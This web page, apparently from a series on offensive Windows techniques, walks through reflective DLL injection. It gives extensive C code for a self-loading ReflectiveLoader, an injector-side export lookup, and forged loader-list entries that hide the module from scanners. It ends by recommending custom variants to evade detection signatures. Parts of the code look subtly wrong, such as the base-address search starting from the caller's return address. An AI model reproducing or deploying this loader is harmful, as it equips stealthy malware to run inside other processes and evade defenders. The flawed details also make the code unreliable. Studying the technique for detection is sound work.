---
layout: page
title: "Reflective DLL Injection: Loading Without the Loader"
---

# Reflective DLL Injection: Loading Without the Loader

The Windows loader is a trusted component. When `LoadLibrary` is called, it reads the DLL from disk, maps it into memory, resolves imports, applies relocations, and registers the module in the PEB's loaded module list. Every step is visible: the file is accessed, the mapping appears in the module list, and hooks on `LoadLibrary` and `LdrLoadDll` fire. A DLL loaded through the standard loader is, by design, transparent to the system.

Reflective DLL injection replaces the loader entirely. The DLL contains a function, `ReflectiveLoader`, that performs every step the Windows loader would perform, but from memory, without touching disk, without calling `LoadLibrary`, and optionally without registering in any system structure that a scanner could enumerate.

The mechanism is self-referential: a function inside the DLL loads the DLL that contains it.

## Finding the Base Address

The first problem `ReflectiveLoader` must solve is locating its own base address in memory. It was called from somewhere, but it does not know where it was placed. The Windows loader would have this information because it performed the mapping. The reflective loader has to discover it.

On x64, the function's own address is available through the instruction pointer. A common approach walks backward from the current instruction pointer, searching for the MZ signature (`0x4D5A`) that marks the start of a PE file. Every 4KB page boundary is a candidate until the correct header is found.

```c
#ifdef _WIN64
#define ULONG_PTR_SIZE 8
#else
#define ULONG_PTR_SIZE 4
#endif

ULONG_PTR reflective_loader_base(void) {
    // Get current instruction pointer
    ULONG_PTR addr;
#ifdef _WIN64
    addr = (ULONG_PTR)_ReturnAddress();
#else
    __asm { mov eax, [esp] }
    // simplified -- actual implementation reads EIP
    addr = (ULONG_PTR)_ReturnAddress();
#endif

    // Walk backward in 4KB steps looking for MZ header
    while (TRUE) {
        // Align down to page boundary
        addr &= ~(0x1000 - 1);

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)addr;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt =
                (PIMAGE_NT_HEADERS)(addr + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) {
                // Found a valid PE: this is our base
                return addr;
            }
        }
        addr -= 0x1000;
    }
}
```

This walks backward one page at a time until it finds a page starting with the DOS magic bytes followed by a valid NT signature. That page is the beginning of the DLL's mapped image. From there, every offset in the PE headers is meaningful.

## Resolving the API Without Importing It

`ReflectiveLoader` cannot use the import table to resolve the functions it needs. The import table has not been processed yet. It must resolve `VirtualAlloc`, `GetProcAddress`, `LoadLibraryA`, and `FlushInstructionCache` by the same PEB-walking technique described in the obfuscators article.

```c
// djb2-style hash for export name comparison
DWORD hash_string(const char *str) {
    DWORD h = 0x4E67C6A7;
    while (*str)
        h = (h >> 13) | (h << 19), h += (BYTE)*str++;
    return h;
}

// Find a function in a loaded module by export name hash
LPVOID find_export(ULONG_PTR module_base, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module_base;
    PIMAGE_NT_HEADERS nt  =
        (PIMAGE_NT_HEADERS)(module_base + dos->e_lfanew);

    DWORD exp_rva =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
        .VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)(module_base + exp_rva);

    PDWORD  names    = (PDWORD) (module_base + exp->AddressOfNames);
    PWORD   ords     = (PWORD)  (module_base + exp->AddressOfNameOrdinals);
    PDWORD  funcs    = (PDWORD) (module_base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(module_base + names[i]);
        if (hash_string(name) == target_hash)
            return (LPVOID)(module_base + funcs[ords[i]]);
    }
    return NULL;
}

// Walk PEB InMemoryOrderModuleList to find kernel32 and ntdll bases
void resolve_required_apis(
    LPVOID *pVirtualAlloc,
    LPVOID *pLoadLibraryA,
    LPVOID *pGetProcAddress,
    LPVOID *pFlushInstructionCache
) {
    // PEB at GS:0x60 (x64) or FS:0x30 (x86)
#ifdef _WIN64
    ULONG_PTR peb = __readgsqword(0x60);
#else
    ULONG_PTR peb = __readfsdword(0x30);
#endif

    ULONG_PTR ldr    = *(ULONG_PTR *)(peb  + 0x18);
    ULONG_PTR flink  = *(ULONG_PTR *)(ldr  + 0x20); // InMemoryOrderModuleList

    // entry[0] = process itself, entry[1] = ntdll, entry[2] = kernel32
    ULONG_PTR entry  = *(ULONG_PTR *)flink;          // ntdll entry
    entry            = *(ULONG_PTR *)entry;          // kernel32 entry

    ULONG_PTR k32_base = *(ULONG_PTR *)(entry + 0x20); // DllBase offset

    // Precomputed hashes for the required functions
    *pVirtualAlloc        = find_export(k32_base, 0x97BC257F);
    *pLoadLibraryA        = find_export(k32_base, 0xEC0E4E8E);
    *pGetProcAddress      = find_export(k32_base, 0x7C0DFCAA);
    *pFlushInstructionCache = find_export(k32_base, 0xEFB7BF26);
}
```

The hash values are computed at compile time from the function names. At runtime, `find_export` walks the export directory of kernel32 and compares hashes, returning the function address without any string comparison against a visible literal.

## Allocating and Mapping the Image

With the APIs resolved and the source base address known, `ReflectiveLoader` allocates memory for the full image and copies the DLL into it. This mirrors what the Windows loader does, but in user space, from the source bytes already in memory.

```c
DWORD WINAPI ReflectiveLoader(LPVOID reserved) {
    // Step 1: find our own base
    ULONG_PTR src_base = reflective_loader_base();

    PIMAGE_DOS_HEADER src_dos = (PIMAGE_DOS_HEADER)src_base;
    PIMAGE_NT_HEADERS src_nt  =
        (PIMAGE_NT_HEADERS)(src_base + src_dos->e_lfanew);

    // Step 2: resolve APIs without imports
    typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef HMODULE(WINAPI *LoadLibraryA_t)(LPCSTR);
    typedef FARPROC(WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
    typedef BOOL   (WINAPI *FlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);

    VirtualAlloc_t         pVirtualAlloc;
    LoadLibraryA_t         pLoadLibraryA;
    GetProcAddress_t       pGetProcAddress;
    FlushInstructionCache_t pFlushInstructionCache;

    resolve_required_apis(
        (LPVOID *)&pVirtualAlloc,
        (LPVOID *)&pLoadLibraryA,
        (LPVOID *)&pGetProcAddress,
        (LPVOID *)&pFlushInstructionCache
    );

    // Step 3: allocate memory for the full image
    ULONG_PTR dst_base = (ULONG_PTR)pVirtualAlloc(
        (LPVOID)src_nt->OptionalHeader.ImageBase,
        src_nt->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    // Step 4: copy headers
    ULONG_PTR src = src_base;
    ULONG_PTR dst = dst_base;
    DWORD     header_size = src_nt->OptionalHeader.SizeOfHeaders;
    while (header_size--)
        *(BYTE *)dst++ = *(BYTE *)src++;

    // Step 5: copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(
        (PIMAGE_NT_HEADERS)(dst_base + ((PIMAGE_DOS_HEADER)dst_base)->e_lfanew)
    );

    for (WORD i = 0; i < src_nt->FileHeader.NumberOfSections; i++) {
        ULONG_PTR dst_section = dst_base + section[i].VirtualAddress;
        ULONG_PTR src_section = src_base + section[i].PointerToRawData;
        DWORD     raw_size    = section[i].SizeOfRawData;

        while (raw_size--)
            *(BYTE *)dst_section++ = *(BYTE *)src_section++;
    }
```

At this point, the full DLL image is in a new allocation at `dst_base`. Headers and all sections are copied. The image is consistent but not yet functional: relocations have not been applied, imports have not been resolved.

## Applying Relocations

If `dst_base` differs from the preferred `ImageBase`, every absolute address in the image is off by the delta. The relocation directory lists every such address.

```c
    // Step 6: apply relocations
    ULONG_PTR delta = dst_base - src_nt->OptionalHeader.ImageBase;

    if (delta) {
        PIMAGE_NT_HEADERS dst_nt =
            (PIMAGE_NT_HEADERS)(dst_base + ((PIMAGE_DOS_HEADER)dst_base)->e_lfanew);

        PIMAGE_DATA_DIRECTORY reloc_dir =
            &dst_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        PIMAGE_BASE_RELOCATION reloc =
            (PIMAGE_BASE_RELOCATION)(dst_base + reloc_dir->VirtualAddress);

        while (reloc->VirtualAddress) {
            PWORD entries = (PWORD)((ULONG_PTR)reloc + sizeof(*reloc));
            DWORD count   = (reloc->SizeOfBlock - sizeof(*reloc)) / sizeof(WORD);

            for (DWORD i = 0; i < count; i++) {
                WORD type   = entries[i] >> 12;
                WORD offset = entries[i] & 0x0FFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR *patch =
                        (ULONG_PTR *)(dst_base + reloc->VirtualAddress + offset);
                    *patch += delta;
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)(
                (ULONG_PTR)reloc + reloc->SizeOfBlock
            );
        }
    }
```

## Resolving the Import Table

The import directory lists every DLL the payload depends on and every function it imports from each. Each entry contains a library name and a list of function names or ordinals. The loader must call `LoadLibraryA` for each dependency and `GetProcAddress` for each function, then write the resolved addresses into the import address table.

```c
    // Step 7: resolve imports
    PIMAGE_NT_HEADERS dst_nt =
        (PIMAGE_NT_HEADERS)(dst_base + ((PIMAGE_DOS_HEADER)dst_base)->e_lfanew);

    PIMAGE_DATA_DIRECTORY import_dir =
        &dst_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    PIMAGE_IMPORT_DESCRIPTOR import_desc =
        (PIMAGE_IMPORT_DESCRIPTOR)(dst_base + import_dir->VirtualAddress);

    while (import_desc->Name) {
        const char *lib_name = (const char *)(dst_base + import_desc->Name);
        HMODULE lib = pLoadLibraryA(lib_name);

        PIMAGE_THUNK_DATA thunk_orig =
            (PIMAGE_THUNK_DATA)(dst_base + import_desc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA thunk_iat  =
            (PIMAGE_THUNK_DATA)(dst_base + import_desc->FirstThunk);

        while (thunk_orig->u1.AddressOfData) {
            FARPROC func;

            if (IMAGE_SNAP_BY_ORDINAL(thunk_orig->u1.Ordinal)) {
                // Import by ordinal
                func = pGetProcAddress(
                    lib,
                    (LPCSTR)IMAGE_ORDINAL(thunk_orig->u1.Ordinal)
                );
            } else {
                // Import by name
                PIMAGE_IMPORT_BY_NAME ibn =
                    (PIMAGE_IMPORT_BY_NAME)(dst_base
                                           + thunk_orig->u1.AddressOfData);
                func = pGetProcAddress(lib, (LPCSTR)ibn->Name);
            }

            // Write resolved address into the IAT
            thunk_iat->u1.Function = (ULONG_PTR)func;
            thunk_orig++;
            thunk_iat++;
        }
        import_desc++;
    }
```

After this step, every entry in the import address table points to a valid function in a loaded module. The DLL's code can call `CreateThread`, `VirtualAlloc`, or any other API it imported, because the addresses are resolved.

## Calling DllMain

The image is now fully mapped and functional. The final step is calling `DllMain` with `DLL_PROCESS_ATTACH`:

```c
    // Step 8: flush instruction cache and call DllMain
    pFlushInstructionCache(
        (HANDLE)-1,
        (LPVOID)dst_base,
        src_nt->OptionalHeader.SizeOfImage
    );

    typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

    DllMain_t dllmain = (DllMain_t)(
        dst_base + dst_nt->OptionalHeader.AddressOfEntryPoint
    );

    return dllmain((HINSTANCE)dst_base, DLL_PROCESS_ATTACH, NULL);
}
```

`FlushInstructionCache` is necessary on x86 because the processor's instruction cache may hold stale data from before the memory was written. On x64 with a coherent cache, the call is technically unnecessary but harmless and expected by convention.

## Delivering the Loader

`ReflectiveLoader` is exported from the DLL by name so that the injector can find and call it. The injector writes the DLL bytes into the target process using any injection primitive (shellcode injection, APC, or NTDLL-direct calls), then finds the exported `ReflectiveLoader` offset within the raw bytes and creates a thread at that address.

```c
// Injector side: find ReflectiveLoader offset in raw DLL bytes
DWORD find_reflective_loader_offset(BYTE *dll_bytes) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_bytes;
    PIMAGE_NT_HEADERS nt  =
        (PIMAGE_NT_HEADERS)(dll_bytes + dos->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        dll_bytes +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD names = (PDWORD)(dll_bytes + exp->AddressOfNames);
    PWORD  ords  = (PWORD) (dll_bytes + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)(dll_bytes + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (strcmp((char *)(dll_bytes + names[i]), "ReflectiveLoader") == 0)
            return funcs[ords[i]];  // RVA of ReflectiveLoader
    }
    return 0;
}
```

The injector writes the raw DLL bytes into the target, adds the `ReflectiveLoader` RVA to get the absolute address in the target, and creates a thread there. `ReflectiveLoader` runs, finds its own base by walking backward from the call site, and executes the full loading sequence described above.

## The Module List Gap

By default, the reflectively loaded DLL does not appear in the PEB's `InMemoryOrderModuleList`. A memory scanner comparing all committed executable regions against the module list finds an anonymous executable region with no corresponding module entry. That region contains PE headers: another anomaly. The combination is a strong indicator.

Closing this gap requires inserting an entry into the module list. The `LDR_DATA_TABLE_ENTRY` structure holds the module name, base address, size, and list pointers. Allocating a structure, filling in the fields, and linking it into the `InLoadOrderModuleList` and `InMemoryOrderModuleList` makes the module appear as if the standard loader had loaded it.

```c
// Skeleton -- field offsets vary between Windows versions
typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    // ... additional fields
} LDR_DATA_TABLE_ENTRY_CUSTOM;
```

Inserting a crafted entry into the list makes the module indistinguishable from a legitimately loaded one to any tool that enumerates modules through the PEB. Tools that cross-reference the PEB list against the actual mapped sections using `VirtualQuery` can still detect the inconsistency, since the region will not have a section object backing it the way a normally loaded module does.

## What Changes Compared to Earlier Techniques

Process hollowing substitutes the code inside a legitimate process identity. Reflective DLL injection is more flexible: it does not require spawning a new process and it does not unmap anything. The DLL coexists with the process's original code. It can be injected into an already-running process using any delivery mechanism, and it self-loads without any interaction with the Windows loader.

The trade-off is that both the raw DLL bytes and the mapped image exist in the target process simultaneously, doubling the memory footprint. More importantly, `ReflectiveLoader` itself is a recognizable function. Its structure and behavior are well documented, and heuristic signatures for it exist in most detection engines. Custom implementations of the same concept, with non-standard search strategies and different hash algorithms, are necessary to avoid those signatures.
